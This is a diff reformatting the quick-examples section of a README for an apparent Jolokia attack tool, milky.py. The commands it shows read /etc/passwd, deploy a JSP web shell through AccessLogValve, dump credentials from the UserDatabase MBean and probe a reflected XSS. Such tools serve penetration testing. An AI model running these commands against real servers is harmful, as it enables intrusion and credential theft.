@@ -18,20 +18,28 @@ pip install -r requirements.txt
 
 ## Quick examples
 
-# verification of Jolokia misconfiguration
+### Verification of Jolokia misconfiguration
+```
 python3 milky.py http://target:8080/jolokia scan
-
-# read /etc/passwd through DiagnosticCommand
+```
+### Read /etc/passwd through DiagnosticCommand
+```
 python3 milky.py http://target:8080/jolokia read -f /etc/passwd
+```
 
-# drop & verify a JSP shell via AccessLogValve
+### Drop & verify a JSP shell via AccessLogValve
+```
 python3 milky.py http://target:8080/jolokia deploy
+```
 
-# dump credentials from the UserDatabase MBean
+### Dump credentials from the UserDatabase MBean
+```
 python3 milky.py http://target:8080/jolokia creds
-
-# reflected‑XSS probe (CVE‑2018‑1000129)
+```
+### Reflected‑XSS probe (CVE‑2018‑1000129)
+```
 python3 milky.py http://target:8080/jolokia xss
+```
 
 > Add --debug for full HTTP traces and --user/--password for Basic‑Auth.
 
